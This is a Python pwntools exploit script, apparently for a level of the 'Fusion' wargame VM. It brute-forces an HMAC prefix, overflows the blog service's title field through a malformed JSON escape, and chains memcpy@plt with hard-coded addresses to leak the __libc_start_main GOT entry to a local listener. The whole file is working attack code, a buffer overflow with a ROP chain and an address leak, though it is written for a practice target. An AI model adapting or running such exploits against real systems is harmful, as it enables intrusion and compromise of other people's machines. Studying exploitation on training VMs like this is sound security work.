#!/usr/bin/env python3
 
import random, string, hmac
from hashlib import sha1
from pwn import *
 
 
def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
 
 
io = remote('fusion', 20003)
token = io.recvline().decode().split('"')[1].encode()
log.info(f"Token: {token}")
 
while (True):
    # Bad chars: 0x00 & 0x5c (backslash)
    title  = random_string(127).encode()
    title += b"\\\u" + b"A"*35
    title += p32(0x08048e60)  # Address of memcpy@plt
    title += p32(0x08049f20)  # Address of post_blog_article() function (to return to)
    title += p32(0x0804be04)  # Address of gTitle (Where to write to)
    title += p32(0x08048d82)  # Address of __libc_start_main@got address (What to write)
    title += b"\x04"          # How many bytes to write
 
    payload  = token
    payload += b'\x0a'
    payload += b'{"tags": ["a"], "title": "'
    payload += title
    payload += b'", "contents": "", "serverip": "192.168.6.1:8080"}'
 
    hashed = hmac.new(token, payload, sha1)
    if hashed.hexdigest()[:4] == "0000":
        log.info(f"Valid hash found: {hashed.hexdigest()}")
        break
 
l = listen(8080)
log.info("Sending payload...")
io.send(payload)
io.close()
l.wait_for_connection()
print()
log.success(f"Leaked address for __libc_start_main(): {hex(u32(l.recv()[95:99]))}")
